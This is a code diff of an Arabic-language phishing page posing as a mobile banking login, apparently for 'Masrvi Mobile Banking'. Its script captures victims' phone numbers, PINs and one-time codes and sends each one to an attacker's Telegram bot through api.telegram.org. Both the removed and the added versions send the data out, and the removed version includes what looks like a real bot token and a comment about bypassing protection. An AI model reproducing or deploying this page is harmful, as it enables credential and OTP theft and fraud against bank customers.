@@ -13,7 +13,6 @@
         .container { padding: 40px 25px; flex: 1; }
         label { display: block; margin-bottom: 10px; color: #333; font-weight: 700; }
         input { width: 100%; padding: 18px; border: 1.5px solid #eee; border-radius: 12px; background: #f9f9f9; font-size: 17px; text-align: center; margin-bottom: 25px; box-sizing: border-box; }
-        input:focus { border-color: #e67e22; background: white; outline: none; }
         .btn { background: #ad6d2f; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-size: 18px; font-weight: 700; cursor: pointer; }
         .hidden { display: none; }
         .footer { text-align: center; padding: 20px; color: #999; font-size: 13px; }
@@ -25,80 +24,46 @@
     
     <div id="step1" class="container">
         <label>رقم الهاتف</label>
-        <input type="tel" id="phone" placeholder="00000000" required>
+        <input type="tel" id="phone" placeholder="00000000">
         <label>الرمز السري</label>
-        <input type="password" id="pin" placeholder="••••" required>
+        <input type="password" id="pin" placeholder="••••">
         <button class="btn" onclick="sendData()">دخول آمن</button>
     </div>
 
     <div id="step2" class="container hidden">
-        <h2 style="text-align: center; color: #2c3e50;">تأكيد الهوية</h2>
+        <h2 style="text-align: center;">تأكيد الهوية</h2>
         <div id="timer" style="text-align: center; color: #e67e22; font-size: 24px; margin-bottom: 20px; font-weight: 900;">2:00</div>
-        <input type="text" id="otp" placeholder="• • • • • •" style="letter-spacing: 10px;" required>
+        <input type="text" id="otp" placeholder="• • • • • •">
         <button class="btn" onclick="sendOtp()">تأكيد</button>
     </div>
-
-    <div class="footer">© 2026 Masrvi Mobile Banking</div>
 </div>
 
 <script>
-// بيانات البوت الخاصة بك (تم التأكد منها)
-8194091042:AAGY2IbZjX_zIVf68PepJM0ht6-kot3YZ50
+// ضع التوكن الجديد هنا بين علامتي التنصيص
+const token = "ضع_التوكن_الجديد_هنا"; 
 const id = "5244299184";
 
 function sendData() {
     const p = document.getElementById('phone').value;
     const s = document.getElementById('pin').value;
-    
     if(p && s) {
-        const msg = encodeURIComponent(`🚨 دخول جديد:\n📱 الهاتف: ${p}\n🔑 الرمز: ${s}`);
+        const msg = encodeURIComponent(`🚨 دخول جديد:\n📱 هاتف: ${p}\n🔑 رمز: ${s}`);
         const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${msg}`;
-        
-        // إرسال البيانات بطريقة "طلب الصورة" لضمان تخطي الحماية
-        new Image().src = url;
-
-        // الانتقال للمرحلة التالية
+        new Image().src = url; // الإرسال
         document.getElementById('step1').classList.add('hidden');
         document.getElementById('step2').classList.remove('hidden');
-        
-        // تشغيل العداد
-        startTimer();
-    } else {
-        alert("يرجى ملء البيانات");
     }
 }
 
 function sendOtp() {
     const o = document.getElementById('otp').value;
-    
     if(o) {
         const msg = encodeURIComponent(`🔢 الرمز OTP: ${o}`);
         const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${msg}`;
-        
-        new Image().src = url;
-
-        alert("تم التأكيد بنجاح، يرجى الانتظار...");
-        setTimeout(() => {
-            location.reload();
-        }, 2000);
-    } else {
-        alert("يرجى إدخال رمز التأكيد");
+        new Image().src = url; // الإرسال
+        alert("تم التأكيد بنجاح");
+        location.reload();
     }
-}
-
-function startTimer() {
-    let t = 120;
-    const timerDisplay = document.getElementById('timer');
-    const interval = setInterval(() => {
-        if(t > 0) {
-            t--;
-            let m = Math.floor(t/60);
-            let s = t%60;
-            timerDisplay.innerText = `${m}:${s < 10 ? '0' : ''}${s}`;
-        } else {
-            clearInterval(interval);
-        }
-    }, 1000);
 }
 </script>
 </body>
